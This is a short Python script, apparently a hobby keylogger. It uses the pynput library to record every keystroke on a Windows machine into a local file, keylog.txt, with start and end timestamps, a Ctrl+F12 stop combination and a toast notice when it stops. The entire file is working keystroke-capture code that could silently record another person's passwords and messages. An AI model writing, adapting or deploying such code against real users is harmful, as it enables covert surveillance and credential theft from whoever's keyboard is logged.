from pynput.keyboard import Key, Listener
from datetime import datetime
from win10toast import ToastNotifier

'''NOTE: PRESS CTRL + F12 TO STOP KEYLOGGER'''

def log(text):
    with open("keylog.txt", "a") as f:
        f.write(str(text))
        f.close()

def on_press(key):
    if key in EXIT_COMBINATION:
        active_keys.add(key)
        if all(k in active_keys for k in EXIT_COMBINATION):
            listener.stop()

    try:
        log(key.char)
    except AttributeError:
        if key == Key.backspace:
            log("\n[BACKSPACE]\n")
        elif key == Key.tab:
            log("\n[TAB]\n")
        elif key == Key.enter:
            log("\n[ENTER]\n")
        elif key == Key.shift:
            pass
        elif key == Key.space:
            log(" ")
        else:
            log("\n" + str(key) + "\n")


def on_release(key):
    pass

EXIT_COMBINATION = {Key.ctrl_l, Key.f12}
active_keys = set()

start_date = datetime.now()
start_minute = str(start_date.minute)
if len(start_minute) == 1:
    start_minute = "0" + start_minute

log("-----------------------------\n")
log(f"Start Time: {start_date.hour}:{start_minute} {start_date.month}/{start_date.day}/{start_date.year}\n")
log("-----------------------------\n")

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

end_date = datetime.now()
end_minute = str(end_date.minute)
if len(end_minute) == 1:
    end_minute = "0" + end_minute

log("-----------------------------\n")
log(f"End Time: {end_date.hour}:{end_minute} {end_date.month}/{end_date.day}/{end_date.year}\n")
log("-----------------------------\n")


ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)